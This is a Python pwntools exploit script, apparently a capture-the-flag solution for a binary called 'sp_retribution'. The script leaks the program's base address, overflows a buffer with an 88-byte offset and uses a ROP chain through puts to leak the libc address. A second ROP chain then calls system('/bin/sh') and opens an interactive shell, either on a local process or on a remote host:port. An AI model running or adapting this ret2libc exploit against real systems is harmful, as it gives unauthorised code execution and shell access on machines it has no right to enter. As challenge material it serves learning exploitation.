#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF('sp_retribution')
glibc = ELF('glibc/libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def main():
    p = get_process()

    p.sendlineafter(b'>> ', b'2')
    p.recvuntil(b'[*] Insert new coordinates:')
    p.sendlineafter(b'y = ', b'AAAAAAA')

    p.recvuntil(b'y = AAAAAAA\n')
    leak = u64(p.recvline().strip().ljust(8, b'\0'))

    elf.address = leak - 0xd70
    log.success(f'ELF base address: {hex(elf.address)}')

    rop = ROP(elf)

    offset = 88
    junk = b'A' * offset

    payload  = junk
    payload += p64(rop.rdi[0])
    payload += p64(elf.got.puts)
    payload += p64(elf.plt.puts)
    payload += p64(elf.sym.main)

    p.sendlineafter(b'[*] Verify new coordinates? (y/n): ', payload)
    p.recvline()
    p.recvline()

    puts_addr = u64(p.recvline().strip().ljust(8, b'\0'))
    log.info(f'Leaked puts() address: {hex(puts_addr)}')

    glibc.address = puts_addr - glibc.sym.puts
    log.success(f'Glibc base address: {hex(glibc.address)}')

    payload  = junk
    payload += p64(rop.rdi[0])
    payload += p64(next(glibc.search(b'/bin/sh')))
    #payload += p64(rop.ret[0])
    payload += p64(glibc.sym.system)

    p.sendlineafter(b'>> ', b'2')
    p.recvuntil(b'[*] Insert new coordinates:')
    p.sendlineafter(b'y = ', b'AAAAAAA')
    p.sendlineafter(b'[*] Verify new coordinates? (y/n): ', payload)
    p.recv()

    p.interactive()


if __name__ == '__main__':
    main()
